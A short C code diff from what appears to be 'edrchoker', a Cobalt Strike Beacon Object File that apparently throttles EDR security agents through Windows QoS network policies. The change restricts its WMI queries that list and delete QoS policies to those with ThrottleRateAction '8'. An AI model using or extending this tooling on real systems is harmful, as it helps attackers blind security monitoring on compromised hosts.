@@ -211,7 +211,7 @@ static int ExecDeleteQuery(IWbemServices* svc, const wchar_t* wql) {
 static void ListPolicies(IWbemServices* svc) {
     BSTR lang  = OLEAUT32$SysAllocString(L"WQL");
     BSTR query = OLEAUT32$SysAllocString(
-        L"SELECT * FROM MSFT_NetQosPolicySettingData");
+        L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE ThrottleRateAction = '8'");
     IEnumWbemClassObject* en = NULL;
     svc->lpVtbl->ExecQuery(svc, lang, query,
         WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en);
@@ -397,7 +397,7 @@ void go(char* args, int len) {
         IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
         if (pSvc) {
             int n = ExecDeleteQuery(pSvc,
-                L"SELECT * FROM MSFT_NetQosPolicySettingData");
+                L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE ThrottleRateAction = '8'");
             BeaconPrintf(CALLBACK_OUTPUT,
                 "[edrchoker] %d QoS policy(s) removed\n", n);
             pSvc->lpVtbl->Release(pSvc);
